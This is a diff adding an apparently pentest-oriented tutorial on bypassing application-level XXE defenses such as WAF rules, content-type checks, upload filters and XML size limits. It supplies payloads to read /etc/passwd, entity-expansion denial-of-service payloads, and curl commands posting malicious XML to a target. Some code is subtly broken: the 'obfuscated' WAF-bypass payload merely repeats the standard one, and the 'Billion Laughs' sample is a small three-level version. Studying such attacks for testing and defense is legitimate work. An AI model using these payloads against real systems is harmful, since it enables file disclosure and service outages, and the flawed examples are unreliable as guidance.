@@ -1,0 +1,147 @@
+---
+title: Application-Level Defenses for XXE Protection
+description: Explore strategies to secure web apps with application-level defenses
+  against XXE attacks.
+keywords:
+- application-level defenses
+- xml external entity
+- XXE
+- web application security
+- WAF
+- content-type validation
+- file upload restrictions
+- xml size limits
+- secure coding practices
+---
+
+# Application-Level Defenses
+
+## Context
+
+The objective of this article is to equip readers to identify, evaluate, and bypass application-level defenses against XML External Entity (XXE) attacks in web applications. To fully engage with this topic, readers should already be familiar with the structure of XML, the HTTP protocol, web application architecture, and the basics of XML External Entity (XXE) attacks.
+
+## Theory
+
+### Application-Level Defense Mechanisms for XXE
+
+Application-level defenses consist of controls implemented directly within the application's code or logic to mitigate the risks posed by XXE attacks. These defenses often focus on restricting XML input capabilities, limiting resource usage, and enforcing secure processing behaviors. The overarching goal is to prevent attackers from exploiting XML vulnerabilities to access unauthorized data or execute harmful operations within the application environment.
+
+### WAF XXE Rules and Application Layer Firewalls
+
+Web Application Firewalls (WAFs) are a common defense mechanism against XXE attacks. These firewalls detect and block malicious XML payloads using either signature-based rules that recognize known attack patterns, or anomaly-based rules that identify deviations from normal behavior. However, attackers may attempt to evade these defenses by crafting payloads that obfuscate entities or use encoding methods to bypass detection.
+
+### Content-Type Validation
+
+Validating the Content-Type headers is crucial to ensure that only the expected XML formats are processed by the application. Attackers might submit malicious XML data disguised as other content types, such as plain text or JSON. Improper validation opens the door for such attacks, allowing malicious XML data to be processed by the application.
+
+### File Upload Restrictions
+
+Restricting file uploads to safe file types and enforcing strict parsing logic can significantly reduce exposure to XXE attacks. Applications should carefully check file types and contents to ensure that malicious XML files are not accidentally accepted by loose validators or misconfigured upload endpoints.
+
+### XML Size and Resource Limiting
+
+It is crucial to set limits on XML document size, the number of entity expansions, and processing time to prevent resource exhaustion attacks. Without these constraints, attackers can initiate denial-of-service attacks by sending large or recursive XML payloads designed to deplete system resources.
+
+### Timeout and Resource Configuration
+
+By configuring appropriate timeouts and memory limits for XML processing, the impact of slow or complex payloads can be minimized. Shorter timeouts and lower memory caps make it more challenging for attackers to exploit resource-intensive vectors associated with XXE attacks.
+
+### Secure Coding Practices for XML Handling
+
+Developers should adopt secure coding practices when dealing with XML. This includes using secure libraries, disabling external entity resolution, and avoiding the use of insecure XML APIs. Code reviews and dependency audits are also vital to identify and remediate insecure XML handling patterns within the application codebase.
+
+## Practice
+
+### Bypassing WAF XXE Rules via Payload Obfuscation
+
+Attackers can exploit weaknesses in WAF detection through payload obfuscation. Below are examples of standard and obfuscated XXE payloads:
+
+- Standard XXE payload for file disclosure:
+  ```xml
+  <?xml version="1.0"?>
+  <!DOCTYPE root [
+  <!ENTITY % d SYSTEM "file:///etc/passwd">
+  %d;
+  ]>
+  <root/>
+  ```
+
+- Obfuscated entity reference to bypass naive WAF filters:
+  ```xml
+  <?xml version="1.0"?>
+  <!DOCTYPE root [
+  <!ENTITY % d SYSTEM "file:///etc/passwd">
+  %d;
+  ]>
+  <root>&#x25;d;</root>
+  ```
+
+This approach demonstrates how attackers can evade WAF or application filters to execute XXE attacks.
+
+### Testing Content-Type Validation Weaknesses
+
+To test for weaknesses in Content-Type validation, the following commands are used to send XML payloads with different Content-Types:
+
+- Send XML with incorrect Content-Type:
+  ```bash
+  curl -X POST -H "Content-Type: text/plain" --data-binary @malicious.xml https://target/upload
+  ```
+
+- Send XML with correct Content-Type to observe differences in application behavior:
+  ```bash
+  curl -X POST -H "Content-Type: application/xml" --data-binary @malicious.xml https://target/upload
+  ```
+
+This assesses whether the application processes XML data regardless of the specified Content-Type.
+
+### Exploiting File Upload Restrictions
+
+Attackers may also try to manipulate file uploads:
+
+- Attempt to upload malicious XML using an allowed file type:
+  ```bash
+  curl -F "file=@malicious.xml;type=text/xml" https://target/upload
+  ```
+
+- Test if the server inspects file content or solely relies on MIME type:
+  ```bash
+  curl -F "file=@malicious.xml;type=image/png" https://target/upload
+  ```
+
+These tests determine if file upload restrictions can be bypassed, allowing malicious XML files to reach the parsing logic.
+
+### Testing XML Size and Resource Limits
+
+Attackers may leverage large or recursive XML structures to exhaust resources:
+
+- Send large/recursive XML to probe for resource exhaustion:
+  ```xml
+  <?xml version="1.0"?>
+  <!DOCTYPE lolz [
+  <!ENTITY a "1234567890" >
+  <!ELEMENT lolz (#PCDATA)>
+  ]>
+  <lolz>&a;&a;&a;... (repeat)</lolz>
+  ```
+
+This test determines if the application enforces XML size/entity expansion limits effectively.
+
+### Probing Timeout and Resource Configuration
+
+A more sophisticated attack, such as the "Billion Laughs" attack, can test timeout and memory configurations:
+
+- Send payload to assess resource limitations:
+  ```xml
+  <?xml version="1.0"?>
+  <!DOCTYPE lolz [
+  <!ENTITY a "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
+  <!ENTITY b "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
+  <!ENTITY c "1234567890">]>
+  <lolz>&a;</lolz>
+  ```
+
+This evaluates the server's vulnerability to resource exhaustion caused by complex XML payloads.
+
+## Tools
+
+- **curl**
